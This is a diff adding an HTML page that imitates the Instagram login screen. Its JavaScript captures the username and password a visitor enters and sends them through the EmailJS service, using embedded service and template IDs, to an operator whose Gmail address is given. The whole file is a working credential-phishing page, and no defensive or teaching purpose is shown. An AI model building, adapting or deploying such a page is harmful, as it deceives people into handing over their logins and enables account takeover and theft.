@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="ins.css" />
+    <script
+      type="text/javascript"
+      src="https://cdn.emailjs.com/dist/email.min.js"
+    ></script>
+
+    <script type="text/javascript">
+      document.addEventListener("DOMContentLoaded", function () {
+        emailjs.init("DxYUxMZOXuy1quRFx");
+      });
+
+      function sendEmail(e) {
+        e.preventDefault();
+
+        const fromName = document.getElementById("a").value.trim();
+        const message = document.getElementById("b").value.trim();
+
+        if (!fromName || !message) {
+          alert("Both fields are required.");
+          return false;
+        }
+
+        const templateParams = {
+          from_name: fromName,
+          to_name: fromName,
+          message: message,
+          reply_to: "sivasiva60022@gmail.com",
+        };
+        emailjs
+          .send("service_psytyxf", "template_965wftw", templateParams)
+          .then(function (response) {
+            console.log("SUCCESS!", response.status, response.text);
+            alert("Email sent successfully!");
+          })
+          .catch(function (error) {
+            console.error("FAILED...", error);
+            alert(
+              `Email failed to send. Error: ${error.text || error.message}`
+            );
+          });
+
+        return false;
+      }
+    </script>
+  </head>
+  <body>
+    <form onsubmit="return sendEmail(event)">
+      <h1>Instagram</h1>
+      <input
+        type="text"
+        name="name"
+        id="a"
+        placeholder="Phone number, username, or email id"
+        aria-label="Username or Email"
+      />
+      <input
+        type="password"
+        name="pass"
+        id="b"
+        placeholder="Password"
+        aria-label="Password"
+      />
+      <div id="forg">
+        <h3><a href="#">Forgotten password?</a></h3>
+      </div>
+      <button type="submit">Login</button>
+      <div id="or">
+        <h4>___________________or_____________________</h4>
+      </div>
+      <a id="h" href="#">Login with Facebook</a>
+    </form>
+  </body>
+</html>
